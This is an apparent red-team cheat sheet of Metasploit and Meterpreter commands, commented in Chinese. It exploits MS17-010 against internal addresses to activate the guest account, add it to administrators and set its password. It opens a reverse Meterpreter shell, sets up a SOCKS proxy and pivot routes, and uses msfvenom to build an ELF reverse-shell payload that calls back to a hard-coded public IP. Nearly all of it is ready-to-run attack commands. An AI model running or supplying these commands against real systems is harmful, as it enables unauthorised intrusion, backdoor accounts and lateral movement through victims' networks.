## msf

```
# spawn msf
# set foreign listener in cs，then spawn
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_https
set lhost 0.0.0.0
set lport 8443
exploit -j

# 显示session列表
sessions
# 进入session(meterpreter)
sessions 1
# 杀掉session
sessions -k 1

# ms-17010执行命令
use auxiliary/admin/smb/ms17_010_command
set rhosts 172.16.100.18
set command cmd.exe /c \"net user guest /active:yes && net localgroup administrators guest /add && net user guest Qweqwe123\"
run

# ms-17010反弹shell
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/reverse_tcp
set RHOSTS 10.1.129.35
run

# 开启sock4a
use auxiliary/server/socks_proxy
set srvhost 0.0.0.0
set srvport 2080
run

# 添加路由
route add 47.168.52.0/8 <session id>

```

## meterpreter

```
# 添加路由
run post/multi/manage/autoroute

# 退出回到msf
background

# 进入shell模式
shell
```



### msfvenom

```
# 生成木马
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=114.215.27.76 LPORT=8443 -f elf > shell.elf
```

